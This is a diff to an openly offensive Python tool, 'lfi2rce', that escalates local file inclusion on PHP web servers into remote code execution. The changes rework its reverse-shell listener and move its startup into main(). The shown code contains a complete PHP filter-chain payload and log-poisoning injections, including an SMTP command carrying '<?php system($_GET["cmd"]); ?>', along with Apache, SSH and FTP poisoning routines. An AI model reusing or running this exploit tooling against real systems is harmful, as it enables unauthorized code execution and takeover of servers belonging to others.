@@ -5,7 +5,7 @@
 import requests,socket,paramiko,threading,sys,time,base64,random,ast
 from urllib.parse import urlparse
 
-print ("lfi2rce - Local File Inclusion To Remote Code Execution v1.1 by 0bfxgh0st*\n")
+print ("lfi2rce - Local File Inclusion To Remote Code Execution v1.0.2 by 0bfxgh0st*\n")
 
 def Help():
 
@@ -117,26 +117,33 @@ def bind(attacker_port):
 		print('connect to [' + conn.getsockname()[0] + '] from [' + addr[0] + '] ' + str(addr[1]))
 
 	def recv():
-		buffersize = 1024
+	
+		conn_buffer_size = 1024
 		while True:
-			data = conn.recv(buffersize)
+			try:
+				data = conn.recv(conn_buffer_size)
+			except Exception:
+				exit(1)
 			sys.stdout.flush()
-			sys.stdout.write(data.decode())
+			sys.stdout.write(data.decode('latin-1'))
 			sys.stdout.flush()
 	t = threading.Thread(target=recv)
 	t.start()
+	stdin_buffer_size = 1024
+
 	while True:
-		
-		stdin = (input()+'\n').encode('utf-8')
-		conn.sendall(stdin)
+		stdin = sys.stdin.buffer.read1(stdin_buffer_size)
+		try:
+			conn.sendall(stdin)
+		except Exception:
+			conn.close()
+			exit(1)
 
 def filterchain(headers,payload,attacker_port):
 
 	filterchainpayload='php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp'
 	if not 'User-Agent' in headers:
-		headers.update(o_headers)
-	c = threading.Thread(target=bind,args=(attacker_port,))
-	c.start()		
+		headers.update(o_headers)		
 	if cookie_mode == True:
 		vookies={cookie:filterchainpayload}
 		cookies_copy = dict(cookies)
@@ -172,9 +179,7 @@ def apache(headers,payload,attacker_port):
 		requests.request(method, url, cookies=cookies , headers=headers, proxies=proxies, data=data, auth=auth)
 	else:	
 		requests.request(method, url, cookies=cookies, headers=headers, proxies=proxies, data=data, auth=auth)
-		
-	c = threading.Thread(target=bind,args=(attacker_port,))
-	c.start()	
+			
 	headers = headers_copy
 	if not 'User-Agent' in headers:
 		headers.update(o_headers)	
@@ -204,8 +209,6 @@ def ssh(headers,payload,attacker_port):
 		ssh.connect(urlparse(url).hostname,ssh_port,username,password)
 	except:
 		pass	
-	c = threading.Thread(target=bind,args=(attacker_port,))
-	c.start()
 	if not 'User-Agent' in headers:
 		headers.update(o_headers)
 	if cookie_mode == True:
@@ -233,8 +236,6 @@ def smtp(headers,payload,attacker_port):
 		time.sleep(1)
 		s.sendall(b'RCPT TO:<?php system($_GET["cmd"]); ?>\n')
 		time.sleep(0.001)
-	c = threading.Thread(target=bind,args=(attacker_port,))
-	c.start()
 	if not 'User-Agent' in headers:
 		headers.update(o_headers)
 	if cookie_mode == True:
@@ -264,8 +265,6 @@ def ftp(headers,payload,attacker_port):
 			s.sendall(b'PASS 1234\n')
 			time.sleep(0.001)
 	print ("💀 Sending payload\n")	
-	c = threading.Thread(target=bind,args=(attacker_port,))
-	c.start()
 	if not 'User-Agent' in headers:
 		headers.update(o_headers)
 	while True:	
@@ -322,6 +321,10 @@ def handler():
 			if argument == '-u' or argument == '--url':
 				n = arguments.index(argument)+1
 				url = arguments[n]
+				if not 'http://' in url and not 'https://' in url:
+					Help()
+					print('\nError: Use http:// or https://')
+					exit(0)
 			if argument == '-r' or argument == '--host':
 				n = arguments.index(argument)+1
 				attacker_ip = arguments[n]
@@ -428,6 +431,9 @@ poison_type,payload,attacker_port,cookie_mode,data_mode,indata,url,auth,log,apac
 
 def main():
 
+	c = threading.Thread(target=bind,args=(attacker_port,))
+	c.start()
+	
 	try:
 		if poison_type.split('-')[0] == 'apache':
 			apache(headers,payload,attacker_port)
@@ -447,6 +453,5 @@ def main():
 		print('Failed to establish a new connection: [Errno 111] Connection refused')
 	except ConnectionRefusedError:
 		print('[Errno 111] Connection refused')
-
 
 main()
